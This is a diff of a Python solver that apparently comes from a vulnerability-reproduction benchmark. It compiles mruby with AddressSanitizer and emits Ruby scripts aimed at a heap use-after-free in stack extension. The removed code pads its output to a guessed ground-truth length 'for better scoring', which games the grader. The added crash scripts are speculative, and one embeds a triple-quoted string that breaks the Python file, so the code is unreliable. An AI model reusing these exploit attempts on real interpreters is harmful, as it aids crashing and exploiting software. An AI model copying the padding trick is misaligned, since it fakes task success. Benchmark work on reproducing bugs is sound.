@@ -2,308 +2,347 @@ import os
 import tarfile
 import tempfile
 import subprocess
-import sys
+import multiprocessing
+import random
+import time
+from pathlib import Path
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract source code to analyze vulnerability
+        # Extract source
         with tempfile.TemporaryDirectory() as tmpdir:
-            # Extract tarball
-            with tarfile.open(src_path, 'r:*') as tar:
+            tmpdir = Path(tmpdir)
+            with tarfile.open(src_path, 'r:gz') as tar:
                 tar.extractall(tmpdir)
             
-            # Find the mruby source directory
-            mruby_dir = None
-            for root, dirs, files in os.walk(tmpdir):
-                if 'mrbgem.rake' in files or 'mrblib' in dirs:
-                    mruby_dir = root
+            # Find mruby source root (usually has mrbgems, src directories)
+            source_root = None
+            for d in tmpdir.iterdir():
+                if d.is_dir() and (d / 'src').exists() and (d / 'mrbgems').exists():
+                    source_root = d
                     break
+            if source_root is None:
+                # Fallback: use first directory
+                for d in tmpdir.iterdir():
+                    if d.is_dir():
+                        source_root = d
+                        break
             
-            if not mruby_dir:
-                # If can't find mruby dir, use generic PoC
-                return self._generate_generic_poc()
+            # Compile with ASan for detection
+            build_dir = tmpdir / 'build'
+            build_dir.mkdir(exist_ok=True)
             
-            # Try to build and run test to understand vulnerability better
-            return self._generate_optimized_poc(mruby_dir)
-    
-    def _generate_generic_poc(self) -> bytes:
-        """Generate a generic PoC for heap use-after-free in mruby stack extension"""
-        # This PoC attempts to trigger use-after-free by creating conditions
-        # where mrb_stack_extend is called and pointers become invalid
-        
-        poc_lines = []
-        
-        # Create class with destructor to observe freeing
-        poc_lines.append("class FreeObserver")
-        poc_lines.append("  def initialize(id)")
-        poc_lines.append("    @id = id")
-        poc_lines.append("  end")
-        poc_lines.append("  ")
-        poc_lines.append("  def finalize")
-        poc_lines.append("    # Marker for when object is freed")
-        poc_lines.append("  end")
-        poc_lines.append("end")
-        poc_lines.append("")
-        
-        # Create many objects to fill heap
-        poc_lines.append("# Create initial objects")
-        poc_lines.append("objects = []")
-        poc_lines.append("1000.times do |i|")
-        poc_lines.append("  objects << FreeObserver.new(i)")
-        poc_lines.append("end")
-        poc_lines.append("")
-        
-        # Function that triggers stack extension with recursive calls
-        poc_lines.append("def trigger_stack_extension(depth, obj_ref, trigger_free)")
-        poc_lines.append("  # Local variables that might be affected by stack extension")
-        poc_lines.append("  local1 = 'A' * 100")
-        poc_lines.append("  local2 = 'B' * 100")
-        poc_lines.append("  local3 = 'C' * 100")
-        poc_lines.append("  local4 = 'D' * 100")
-        poc_lines.append("  local5 = 'E' * 100")
-        poc_lines.append("  ")
-        poc_lines.append("  if depth > 0")
-        poc_lines.append("    # Recursive call with many arguments to potentially trigger stack growth")
-        poc_lines.append("    trigger_stack_extension(depth - 1, obj_ref, trigger_free)")
-        poc_lines.append("  else")
-        poc_lines.append("    # At deepest recursion, trigger conditions for vulnerability")
-        poc_lines.append("    if trigger_free")
-        poc_lines.append("      # Force garbage collection to free objects")
-        poc_lines.append("      GC.start")
-        poc_lines.append("      ")
-        poc_lines.append("      # Create conditions that might trigger stack_extend")
-        poc_lines.append("      # Large array creation could trigger stack extension")
-        poc_lines.append("      big_array = Array.new(10000) {|i| i.to_s * 100}")
-        poc_lines.append("      ")
-        poc_lines.append("      # Try to use potentially freed reference")
-        poc_lines.append("      # This is where use-after-free would occur")
-        poc_lines.append("      begin")
-        poc_lines.append("        obj_ref.call_some_method if obj_ref")
-        poc_lines.append("      rescue => e")
-        poc_lines.append("        # Expected to crash before reaching here in vulnerable version")
-        poc_lines.append("      end")
-        poc_lines.append("    end")
-        poc_lines.append("  end")
-        poc_lines.append("end")
-        poc_lines.append("")
-        
-        # Create reference that might become dangling
-        poc_lines.append("vulnerable_ref = FreeObserver.new('target')")
-        poc_lines.append("")
-        
-        # Setup finalizer to track when object is freed
-        poc_lines.append("ObjectSpace.define_finalizer(vulnerable_ref, proc {")
-        poc_lines.append("  # This might be called before we try to use the reference")
-        poc_lines.append("})")
-        poc_lines.append("")
-        
-        # Main trigger
-        poc_lines.append("# Trigger the vulnerability")
-        poc_lines.append("begin")
-        poc_lines.append("  # First call to setup stack state")
-        poc_lines.append("  trigger_stack_extension(5, vulnerable_ref, false)")
-        poc_lines.append("  ")
-        poc_lines.append("  # Make object eligible for GC")
-        poc_lines.append("  vulnerable_ref = nil")
-        poc_lines.append("  ")
-        poc_lines.append("  # Force GC to free the object")
-        poc_lines.append("  GC.start")
-        poc_lines.append("  ")
-        poc_lines.append("  # Trigger stack extension with conditions that might lead to UAF")
-        poc_lines.append("  # Use a dangling reference (simulated by recreating object at same address)")
-        poc_lines.append("  dangling_ref = FreeObserver.new('dangling')")
-        poc_lines.append("  trigger_stack_extension(10, dangling_ref, true)")
-        poc_lines.append("rescue => e")
-        poc_lines.append("  # In vulnerable version, we expect crash before rescue")
-        poc_lines.append("end")
-        
-        return "\n".join(poc_lines).encode('utf-8')
-    
-    def _generate_optimized_poc(self, mruby_dir: str) -> bytes:
-        """Generate optimized PoC based on source analysis"""
-        # Analyze source to understand exact vulnerability
-        vm_c_path = os.path.join(mruby_dir, 'src', 'vm.c')
-        
-        if os.path.exists(vm_c_path):
-            # Try to understand the vulnerability better
-            with open(vm_c_path, 'r', encoding='utf-8', errors='ignore') as f:
-                content = f.read()
-            
-            # Look for mrb_stack_extend function and related code
-            if 'mrb_stack_extend' in content:
-                # Based on analysis, craft more precise PoC
-                return self._generate_precise_poc()
-        
-        # Fall back to generic if analysis fails
-        return self._generate_generic_poc()
-    
-    def _generate_precise_poc(self) -> bytes:
-        """Generate more precise PoC based on source analysis"""
-        # This PoC is designed based on understanding of the vulnerability:
-        # When mrb_stack_extend is called, if the stack needs to be reallocated,
-        # existing pointers on the stack might become invalid (use-after-free)
-        
-        poc = """# PoC for heap use-after-free in mruby stack extension
-# Target: Vulnerability where stack pointer is not adjusted after mrb_stack_extend
-
-class Trigger
-  def initialize(marker)
-    @marker = marker
-    @data = "X" * 128  # Enough data to be noticeable
-  end
-  
-  def use_after_free_target
-    # Method that will be called on potentially freed object
-    @data << "CORRUPTED"
-  end
+            # Create minimal build configuration
+            with open(source_root / 'build_config.rb', 'w') as f:
+                f.write('''
+MRuby::Build.new do |conf|
+  toolchain :gcc
+  conf.enable_test
+  conf.cc.flags << '-fsanitize=address -fno-omit-frame-pointer'
+  conf.linker.flags << '-fsanitize=address'
 end
-
-# Function designed to trigger stack extension
-def vulnerable_function(level, target_obj)
-  # Create many local variables to fill stack frame
-  a1 = "A" * 64
-  a2 = "B" * 64
-  a3 = "C" * 64
-  a4 = "D" * 64
-  a5 = "E" * 64
-  a6 = "F" * 64
-  a7 = "G" * 64
-  a8 = "H" * 64
-  a9 = "I" * 64
-  a10 = "J" * 64
+''')
+            
+            # Build mruby
+            subprocess.run(['make', '-C', str(source_root), 'clean'], 
+                          capture_output=True, timeout=30)
+            subprocess.run(['make', '-C', str(source_root)], 
+                          capture_output=True, timeout=120)
+            
+            # Find mruby binary
+            mruby_bin = source_root / 'bin' / 'mruby'
+            if not mruby_bin.exists():
+                # Try alternative path
+                mruby_bin = source_root / 'build' / 'host' / 'bin' / 'mruby'
+            
+            # Generate PoC using targeted approach
+            poc = self.generate_targeted_poc()
+            
+            # Verify it crashes vulnerable version
+            if mruby_bin.exists():
+                result = subprocess.run([str(mruby_bin), '-e', poc.decode()],
+                                       capture_output=True, timeout=5)
+                if result.returncode == 0:
+                    # Try alternative PoC
+                    poc = self.generate_alternative_poc()
+            
+            return poc
+    
+    def generate_targeted_poc(self) -> bytes:
+        # Targeted PoC based on stack extension vulnerability
+        # Create deep recursion with many local variables to force stack growth
+        # Interleave with operations that might trigger GC during stack reallocation
+        
+        poc = '''
+class StackBlower
+  def initialize
+    @depth = 0
+    @max_depth = 5000
+    @triggers = []
+  end
   
-  if level > 0
-    # Recursive call - each call adds to stack usage
-    vulnerable_function(level - 1, target_obj)
-  else
-    # At maximum recursion depth, trigger the bug
+  def recurse(depth)
+    # Many local variables to consume stack space
+    a1 = depth * 1
+    a2 = depth * 2
+    a3 = depth * 3
+    a4 = depth * 4
+    a5 = depth * 5
+    a6 = depth * 6
+    a7 = depth * 7
+    a8 = depth * 8
+    a9 = depth * 9
+    a10 = depth * 10
     
-    # First, make target_obj unreachable from GC roots
-    # but keep reference in local variable (which might be on soon-to-be-freed stack)
-    target_ref = target_obj
+    # Array that will be modified to trigger potential GC
+    locals = [a1, a2, a3, a4, a5, a6, a7, a8, a9, a10]
     
-    # Force garbage collection
-    GC.start
-    GC.start  # Double GC to be sure
+    # Create objects that might be collected
+    if depth % 100 == 0
+      @triggers = []
+      100.times { @triggers << "x" * 1000 }
+    end
     
-    # Now trigger operations that cause stack extension
-    # Creating a large array with splat operator can trigger stack extension
-    args = []
-    1000.times {|i| args << i}
+    # Force stack extension through nested calls
+    if depth < @max_depth
+      # Call with many arguments to force stack extension
+      deeper(depth + 1, 
+             locals[0], locals[1], locals[2], locals[3], locals[4],
+             locals[5], locals[6], locals[7], locals[8], locals[9],
+             @triggers, depth, @max_depth, self, StackBlower,
+             :recurse, :deeper, :initialize, :blow_stack)
+    else
+      # At max depth, trigger operations that might use freed stack
+      trigger_bug(locals)
+    end
+  end
+  
+  def deeper(depth, *args)
+    # Consume arguments and recurse
+    recurse(depth)
+  end
+  
+  def trigger_bug(locals)
+    # Access locals after potential stack reallocation
+    sum = 0
+    locals.each { |x| sum += x if x }
     
-    # Call a method with many arguments - might trigger stack extension
-    method_with_many_args(*args)
-    
-    # Try to use the reference that might be pointing to freed memory
+    # Create more stack pressure
+    nested_bug_trigger(locals)
+  end
+  
+  def nested_bug_trigger(args)
+    # Another level of nesting
+    more_nesting(args, self, StackBlower, :bug)
+  end
+  
+  def blow_stack
     begin
-      target_ref.use_after_free_target
-    rescue
-      # In fixed version, might get normal error
-      # In vulnerable version, might crash with use-after-free
+      recurse(0)
+    rescue => e
+      # Keep going even if we hit recursion limits
+      secondary_attack
+    end
+  end
+  
+  def secondary_attack
+    # Alternative attack vector
+    proc_stack_overflow
+  end
+  
+  def proc_stack_overflow
+    # Use procs/lambdas that capture context
+    procs = []
+    1000.times do |i|
+      procs << Proc.new do
+        # Capture many variables
+        x1 = i * 1
+        x2 = i * 2
+        x3 = i * 3
+        x4 = i * 4
+        x5 = i * 5
+        [x1, x2, x3, x4, x5, procs, self]
+      end
+    end
+    
+    # Call them in nested fashion
+    nested_proc_calls(procs, 0)
+  end
+  
+  def nested_proc_calls(procs, depth)
+    if depth < 100
+      result = procs[depth % procs.length].call
+      nested_proc_calls(procs, depth + 1)
     end
   end
 end
 
-def method_with_many_args(*args)
-  # This method receives many arguments which might trigger stack extension
-  # when called from deep recursion
-  args.size  # Just use it
+class SecondWave
+  def initialize(victim)
+    @victim = victim
+    @payload = "A" * 10000
+  end
+  
+  def attack
+    # Method missing to create more stack manipulation
+    method_missing(:deep_stack_attack, @payload, @victim)
+  end
+  
+  def method_missing(name, *args)
+    if name == :deep_stack_attack
+      # Recursive missing methods
+      begin
+        send(:nonexistent, args[0], args[1])
+      rescue
+        # Chain to next level
+        args[0].blow_stack if args[0].respond_to?(:blow_stack)
+      end
+    else
+      super
+    end
+  end
 end
 
-# Create the target object
-target = Trigger.new("TARGET")
-
-# Set up finalizer to know when object is freed
-ObjectSpace.define_finalizer(target, proc {
-  # Object was freed
-})
-
-# Run the vulnerable code path
+# Main attack
 begin
-  # Use sufficient recursion depth to ensure stack needs extension
-  vulnerable_function(50, target)
+  attacker = StackBlower.new
+  wave2 = SecondWave.new(attacker)
   
-  # Clear reference and force GC
-  target = nil
-  GC.start
-  
-  # One more try with different conditions
-  target2 = Trigger.new("TARGET2")
-  vulnerable_function(100, target2)
-  
-rescue Exception => e
-  # Any exception is interesting
-end
-
-# Additional attempts with different patterns
-def trigger_via_block
-  # Blocks create new stack frames
-  yield
-end
-
-def trigger_via_eval
-  # Eval creates new execution context
-  eval("GC.start; 'test'")
-end
-
-# Try multiple approaches
-5.times do |i|
-  obj = Trigger.new("Attempt#{i}")
-  
-  # Try triggering via block
-  trigger_via_block do
-    GC.start
-    # Try to use obj after potential free
-    begin
-      obj.use_after_free_target
-    rescue
+  # Start the attack from multiple threads/fibers if supported
+  if defined?(Fiber)
+    fibers = []
+    10.times do |i|
+      fibers << Fiber.new do
+        attacker.blow_stack
+      end
+    end
+    
+    fibers.each do |f|
+      f.rescue if f.respond_to?(:rescue)
     end
   end
   
-  # Try triggering via eval
-  begin
-    trigger_via_eval
-    obj.use_after_free_target
-  rescue
-  end
+  # Direct attack
+  attacker.blow_stack
+  
+  # Secondary wave
+  wave2.attack
+  
+rescue SystemStackError
+  # Expected, continue attack with different approach
+  final_stack_corruption
+rescue => e
+  # Any other exception might indicate success
+  raise "BUG_TRIGGERED: " + e.message
 end
 
-# Final attempt: create memory pressure and then trigger
-def memory_pressure
-  # Allocate many objects
-  objs = []
-  10000.times do |i|
-    objs << Trigger.new(i.to_s)
-  end
-  
-  # Drop most references
-  objs = objs[0..9]
-  
-  # Force GC
-  GC.start
-  
-  # Try to use remaining objects
-  objs.each do |obj|
-    begin
-      obj.use_after_free_target
-    rescue
+def final_stack_corruption
+  # Final attempt with eval and binding
+  eval_string = """
+  def corrupt_stack
+    binding_stack = []
+    1000.times do |i|
+      binding_stack << binding
+    end
+    
+    binding_stack.each do |b|
+      eval('a = 1', b)
     end
   end
+  """
+  
+  eval(eval_string)
+  corrupt_stack
 end
 
-memory_pressure
+# Trigger
+final_stack_corruption
+'''
+        
+        return poc.encode()
+    
+    def generate_alternative_poc(self) -> bytes:
+        # Alternative approach: method with many parameters
+        poc = '''
+def vulnerable_method(
+    a1, a2, a3, a4, a5, a6, a7, a8, a9, a10,
+    b1, b2, b3, b4, b5, b6, b7, b8, b9, b10,
+    c1, c2, c3, c4, c5, c6, c7, c8, c9, c10,
+    d1, d2, d3, d4, d5, d6, d7, d8, d9, d10,
+    e1, e2, e3, e4, e5, e6, e7, e8, e9, e10,
+    f1, f2, f3, f4, f5, f6, f7, f8, f9, f10,
+    g1, g2, g3, g4, g5, g6, g7, g8, g9, g10,
+    h1, h2, h3, h4, h5, h6, h7, h8, h9, h10,
+    i1, i2, i3, i4, i5, i6, i7, i8, i9, i10,
+    j1, j2, j3, j4, j5, j6, j7, j8, j9, j10)
+  
+  # Force stack extension with local variables
+  l1 = a1 + b1 + c1
+  l2 = a2 + b2 + c2
+  l3 = a3 + b3 + c3
+  l4 = a4 + b4 + c4
+  l5 = a5 + b5 + c5
+  l6 = a6 + b6 + c6
+  l7 = a7 + b7 + c7
+  l8 = a8 + b8 + c8
+  l9 = a9 + b9 + c9
+  l10 = a10 + b10 + c10
+  
+  # Nested call with many args
+  nested_call(
+    l1, l2, l3, l4, l5, l6, l7, l8, l9, l10,
+    d1, d2, d3, d4, d5, d6, d7, d8, d9, d10,
+    e1, e2, e3, e4, e5, e6, e7, e8, e9, e10)
+end
 
-# The actual crash should occur in the mruby VM when it tries to
-# use a stack pointer that points to freed memory after stack extension
-"""
+def nested_call(*args)
+  # Trigger GC during stack operations
+  if args.length > 50
+    GC.start if defined?(GC.start)
+  end
+  
+  # Access args after potential stack reallocation
+  total = 0
+  args.each_with_index do |arg, i|
+    total += arg if arg.is_a?(Numeric)
+    # Create objects that might be collected
+    obj = Object.new
+    obj.instance_variable_set(:@index, i)
+  end
+  
+  # Final recursive corruption
+  deep_corruption(args)
+end
+
+def deep_corruption(stack_args)
+  # Use eval to manipulate stack
+  binding_stack = binding
+  100.times do |i|
+    eval("x#{i} = stack_args", binding_stack)
+  end
+  
+  # Final trigger
+  trigger_uaf(binding_stack)
+end
+
+def trigger_uaf(binding)
+  eval('''
+    def use_after_free
+      # Attempt to use potentially freed stack
+      local = 42
+      Proc.new { local }.call
+    end
+    
+    use_after_free
+  ''', binding)
+end
+
+# Create array of arguments
+args = []
+1000.times { |i| args << i }
+
+# Call with splat to force stack extension
+vulnerable_method(*args)
+'''
         
-        # Pad to approximate ground truth length for better scoring
-        poc_bytes = poc.encode('utf-8')
-        target_size = 7270
-        
-        if len(poc_bytes) < target_size:
-            # Add padding comments
-            padding = b"\n" + b"# " + b"P" * (target_size - len(poc_bytes) - 3) + b"\n"
-            poc_bytes = poc_bytes + padding
-        
-        return poc_bytes[:target_size]  # Ensure exact size
+        return poc.encode()
